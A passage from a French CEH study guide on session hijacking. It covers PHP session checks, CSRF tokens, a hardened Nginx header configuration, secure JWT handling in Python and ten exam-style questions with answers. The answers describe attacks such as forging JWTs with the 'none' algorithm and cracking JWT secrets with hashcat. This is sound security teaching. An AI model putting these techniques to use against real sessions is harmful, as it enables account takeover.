    if ($_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {
        session_destroy();
        die('Session invalidée : changement d\'IP');
    }
    
    // Vérifier User-Agent
    if ($_SESSION['ua'] !== $_SERVER['HTTP_USER_AGENT']) {
        session_destroy();
        die('Session invalidée : changement de navigateur');
    }
    
    // Vérifier expiration
    if (time() - $_SESSION['created'] > 1800) {
        session_destroy();
        die('Session expirée');
    }
}

// 6. CSRF TOKEN
function generate_csrf_token() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function verify_csrf_token($token) {
    return hash_equals($_SESSION['csrf_token'], $token);
}
?>
```

---

### 🔵 Configuration Nginx sécurisée

```nginx
# /etc/nginx/sites-available/corp.conf

server {
    listen 443 ssl;
    server_name corp.com;
    
    # ── HEADERS DE SÉCURITÉ SESSION ───────────────────────────
    
    # Forcer HTTPS (anti-sniffing)
    add_header Strict-Transport-Security
        "max-age=31536000; includeSubDomains; preload" always;
    
    # Anti-clickjacking
    add_header X-Frame-Options "SAMEORIGIN" always;
    
    # Anti-XSS (navigateurs anciens)
    add_header X-XSS-Protection "1; mode=block" always;
    
    # Anti-MIME sniffing
    add_header X-Content-Type-Options "nosniff" always;
    
    # Content Security Policy (anti-XSS)
    add_header Content-Security-Policy
        "default-src 'self';
         script-src 'self' 'nonce-RANDOM';
         style-src 'self';
         img-src 'self' data:;
         connect-src 'self';
         font-src 'self';
         frame-ancestors 'none'" always;
    
    # Referrer Policy
    add_header Referrer-Policy
        "strict-origin-when-cross-origin" always;
    
    # Cookie Security via Set-Cookie
    proxy_cookie_path / "/; HttpOnly; Secure; SameSite=Strict";
}
```

---

### 🔵 Contre-mesures JWT

```python
# CONFIGURATION JWT SÉCURISÉE (Python/Flask)

import jwt
import secrets
from datetime import datetime, timedelta

# ── GÉNÉRATION D'UNE CLÉ FORTE ────────────────────────────────
SECRET_KEY = secrets.token_hex(64)  # 512 bits - très fort
# Stocker dans variable d'environnement, pas dans le code !

# ── CRÉATION D'UN JWT SÉCURISÉ ────────────────────────────────
def create_token(user_id: int, role: str) -> str:
    payload = {
        'sub': user_id,        # Subject (user ID)
        'role': role,
        'iat': datetime.utcnow(),  # Issued At
        'exp': datetime.utcnow() + timedelta(hours=1),  # Expiry
        'jti': secrets.token_hex(16)  # JWT ID unique (anti-replay)
    }
    
    return jwt.encode(
        payload,
        SECRET_KEY,
        algorithm='HS256'  # Ou RS256 pour asymétrique
    )

# ── VALIDATION STRICTE ────────────────────────────────────────
def verify_token(token: str) -> dict:
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=['HS256'],  # Liste stricte - pas "none" !
            options={
                'require': ['exp', 'iat', 'sub'],  # Champs obligatoires
                'verify_exp': True,
                'verify_iat': True
            }
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise Exception("Token expiré")
    except jwt.InvalidAlgorithmError:
        raise Exception("Algorithme non autorisé")
    except jwt.InvalidTokenError:
        raise Exception("Token invalide")
```

---

## 📌 RÉSUMÉ FINAL — CE QUE L'EXAMEN VA TESTER

```
✅ Architecture des sessions — cookies, JWT, SAML
✅ Attributs de cookies — HttpOnly, Secure, SameSite
✅ XSS + vol de cookie — payload et mécanisme
✅ Session Fixation — principe et code vulnérable vs sécurisé
✅ Session Sniffing — sniffing HTTP non chiffré
✅ Session Prediction — tokens prévisibles
✅ CSRF — mécanisme complet et exploit
✅ CSRF Token — contre-mesure principale
✅ SameSite cookie — protection anti-CSRF
✅ JWT structure — header, payload, signature
✅ JWT "none" algorithm — forger un token sans signature
✅ JWT secret brute force — hashcat mode 16500
✅ MITB vs MITM — différences fondamentales
✅ Burp Suite — Proxy, Repeater, Intruder, Sequencer
✅ session_regenerate_id() — protection fixation
✅ HttpOnly flag — protection contre XSS cookie theft
✅ Contre-mesures complètes — dev + serveur + headers
```

---

## 🧪 QUESTIONS TYPE EXAMEN CEH — MODULE 11

**Q1 :** Quelle différence entre Session Hijacking et Session Fixation ?
> **Réponse : Hijacking = l'attaquant vole une session déjà établie. Fixation = l'attaquant impose un SESSION_ID connu AVANT l'authentification, puis attend que la victime s'authentifie avec ce SESSION_ID.**

**Q2 :** Pourquoi le flag HttpOnly sur un cookie protège-t-il contre le vol de session via XSS ?
> **Réponse : HttpOnly rend le cookie inaccessible au JavaScript. Même si un XSS s'exécute sur la page, `document.cookie` ne retourne pas les cookies HttpOnly. L'attaquant ne peut donc pas les voler via JavaScript.**

**Q3 :** Un JWT a l'algorithme "none" dans son header. Quel risque cela représente-t-il ?
> **Réponse : Si le serveur accepte "none", n'importe qui peut créer un JWT signé sans clé — il suffit de modifier le payload (ex: role=admin) et d'omettre la signature. L'attaquant forge un token valide sans connaître la clé secrète.**

**Q4 :** Expliquer comment une attaque CSRF fonctionne et pourquoi le cookie est automatiquement envoyé.
> **Réponse : Le navigateur envoie automatiquement les cookies d'un domaine pour toutes les requêtes vers ce domaine, quelle que soit leur origine. Un site malveillant peut donc déclencher une requête vers banque.com — le cookie de session est envoyé automatiquement, authentifiant la requête malveillante.**

**Q5 :** Quelle valeur SameSite protège le mieux contre CSRF ?
> **Réponse : `SameSite=Strict` — le cookie n'est envoyé QUE pour les requêtes provenant du même site. Les requêtes cross-site (depuis un site malveillant) n'incluent pas le cookie.**

**Q6 :** Quel module Burp Suite analyse la qualité cryptographique des SESSION_ID ?
> **Réponse : Sequencer — il capture de nombreux tokens, analyse leur entropie effective et indique si les identifiants sont suffisamment aléatoires ou prévisibles.**

**Q7 :** Comment se défend-on contre la Session Fixation ?
> **Réponse : Appeler `session_regenerate_id(true)` immédiatement après une authentification réussie. Cela crée un nouveau SESSION_ID et invalide l'ancien — même si l'attaquant connaissait l'ID pré-authentification, il devient inutilisable.**

**Q8 :** Quelle différence entre MITM et MITB pour le vol de session HTTPS ?
> **Réponse : MITM est bloqué par HTTPS/TLS car le trafic est chiffré. MITB s'exécute dans le navigateur, avant le chiffrement TLS — il intercepte les données en clair. HTTPS ne protège pas contre MITB car l'attaque est côté client.**

**Q9 :** Hashcat mode 16500 est utilisé pour quoi ?
> **Réponse : Cracker les secrets de signature JWT (JSON Web Token). Si la clé HMAC-SHA256 est dans le dictionnaire, Hashcat retrouve la clé, permettant de forger n'importe quel JWT valide.**

**Q10 :** Quels sont les 3 attributs de cookie essentiels à configurer pour sécuriser les sessions ?
> **Réponse : HttpOnly (inaccessible au JS → protège XSS), Secure (HTTPS uniquement → protège sniffing), SameSite=Strict (requêtes same-origin uniquement → protège CSRF). Les trois ensemble forment une défense complète.**

---

> **Module 11 terminé. **
